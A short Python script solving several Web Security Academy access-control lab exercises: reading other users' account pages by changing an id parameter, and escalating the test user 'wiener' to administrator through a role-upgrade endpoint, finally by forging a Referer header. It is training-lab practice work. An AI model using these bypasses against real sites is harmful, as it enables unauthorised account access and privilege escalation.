import requests

s = requests.Session()

# Just used other similar ctfs here. Each separated by a few new lines


# site = 'ac821f561f986c63c0ad3967009d00a5.web-security-academy.net/my-account?id=carlos'
# carlos_account_url = f'https://{site}'
#
# resp = s.get(carlos_account_url, allow_redirects=False)
# print(resp.text)


# site = 'ac201f581f5507c5c02e1d4b004f007a.web-security-academy.net'
# carlos_account_url = f'https://{site}/my-account?id=administrator'
#
# resp = s.get(carlos_account_url, allow_redirects=False)
# print(resp.text)


# site = 'ac1f1fb51e37833bc0b780ef003d004f.web-security-academy.net'
#
# login_url = f'https://{site}/login'
# login_data = {'password': 'peter', 'username': 'wiener'}
# resp = s.post(login_url, data=login_data)
#
# adminrole_url = f'https://{site}/admin-roles'
#
# upgrade_data = {
#     'username': 'wiener',
#     'action': 'upgrade',
#     'confirmed': 'true'
# }
#
# resp = s.post(adminrole_url, data=upgrade_data)
# print(resp.text)
site = 'ac5a1f061f6e5ff6c0d903f6001f0072.web-security-academy.net'
login_url = f'https://{site}/login'
login_data = {'password': 'peter', 'username': 'wiener'}
resp = s.post(login_url, data=login_data)

admin_url = f'https://{site}/admin'
admin_upgrade_url = f'https://{site}/admin-roles?username=wiener&action=upgrade'

resp = s.get(admin_upgrade_url, headers={'referer': admin_url})
print(resp.text)
